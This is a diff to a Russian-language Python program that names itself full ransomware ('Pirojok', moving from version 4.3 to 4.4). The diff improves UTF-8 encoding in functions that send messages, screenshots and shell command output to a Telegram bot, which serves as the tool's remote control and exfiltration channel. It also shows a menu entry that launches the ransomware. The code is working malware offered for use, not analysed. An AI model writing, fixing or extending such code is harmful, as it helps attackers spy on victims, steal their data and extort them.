@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Пирожок - ПОЛНОЦЕННЫЙ ВЫМОГАТЕЛЬ
-Версия 4.3 - СТАБИЛЬНАЯ
+Версия 4.4 - С ИСПРАВЛЕННОЙ КОДИРОВКОЙ UTF-8
 """
 
 import os
@@ -351,7 +351,7 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "4.3.0"
+        self.version = "4.4.0"
         self.command_timeout = 60
         self.admin_mode = False
         self.startup_time = datetime.now()
@@ -576,29 +576,65 @@ class Pirojok:
         return "\n".join(results)
     
     def send_message(self, chat_id, text):
+        """Отправка сообщения с правильной кодировкой UTF-8"""
         try:
+            # Принудительно кодируем в UTF-8 для Telegram
+            if isinstance(text, str):
+                text = text.encode('utf-8').decode('utf-8')
+            
             timestamp = datetime.now().strftime('%H:%M:%S')
             text_with_time = f"[{timestamp}] {text}"
             
             url = f"{self.base_url}/sendMessage"
-            data = {"chat_id": chat_id, "text": text_with_time, "parse_mode": "HTML"}
-            requests.post(url, data=data, timeout=10)
-            print(f"Отправлено: {text[:50]}...")
+            data = {
+                "chat_id": chat_id, 
+                "text": text_with_time, 
+                "parse_mode": "HTML"
+            }
+            
+            # Явно указываем кодировку в заголовках
+            headers = {'Content-Type': 'application/json; charset=utf-8'}
+            
+            response = requests.post(url, json=data, headers=headers, timeout=10)
+            
+            if response.status_code != 200:
+                print(f"Ошибка отправки: {response.status_code} - {response.text}")
+            else:
+                print(f"Отправлено: {text[:50]}...")
+                
         except Exception as e:
             print(f"Send error: {e}")
     
     def send_photo(self, chat_id, photo_bytes, caption=""):
+        """Отправка фото с правильной кодировкой UTF-8"""
         try:
+            # Кодируем подпись в UTF-8
+            if isinstance(caption, str):
+                caption = caption.encode('utf-8').decode('utf-8')
+            
             timestamp = datetime.now().strftime('%H:%M:%S')
             caption_with_time = f"[{timestamp}] {caption}"
             
             url = f"{self.base_url}/sendPhoto"
-            files = {"photo": ("screenshot.jpg", photo_bytes, "image/jpeg")}
-            data = {"chat_id": chat_id, "caption": caption_with_time}
-            requests.post(url, files=files, data=data, timeout=30)
-            print(f"Фото отправлено: {caption[:50]}...")
-        except:
-            pass
+            
+            # Явно указываем кодировку
+            files = {
+                "photo": ("screenshot.jpg", photo_bytes, "image/jpeg")
+            }
+            data = {
+                "chat_id": chat_id, 
+                "caption": caption_with_time
+            }
+            
+            response = requests.post(url, files=files, data=data, timeout=30)
+            
+            if response.status_code == 200:
+                print(f"Фото отправлено: {caption[:50]}...")
+            else:
+                print(f"Ошибка отправки фото: {response.status_code}")
+                
+        except Exception as e:
+            print(f"Photo error: {e}")
     
     def get_system_info(self):
         info = []
@@ -663,8 +699,11 @@ class Pirojok:
             
             result = ""
             if stdout:
+                # Кодируем результат в UTF-8 для отправки
+                stdout = stdout.encode('utf-8', errors='ignore').decode('utf-8')
                 result += f"✅ Результат:\n{stdout}\n"
             if stderr:
+                stderr = stderr.encode('utf-8', errors='ignore').decode('utf-8')
                 result += f"⚠️ Ошибки:\n{stderr}\n"
             
             return result or "✅ Команда выполнена"
@@ -762,7 +801,7 @@ class Pirojok:
             
             if text == "help" or text == "menu":
                 help_text = """
-🥧 <b>ПИРОЖОК V4.3 - МЕНЮ</b>
+🥧 <b>ПИРОЖОК V4.4 - МЕНЮ</b>
 
 <b>🔒 RANSOMWARE:</b>
 • ransom - ЗАПУСТИТЬ ВЫМОГАТЕЛЯ!
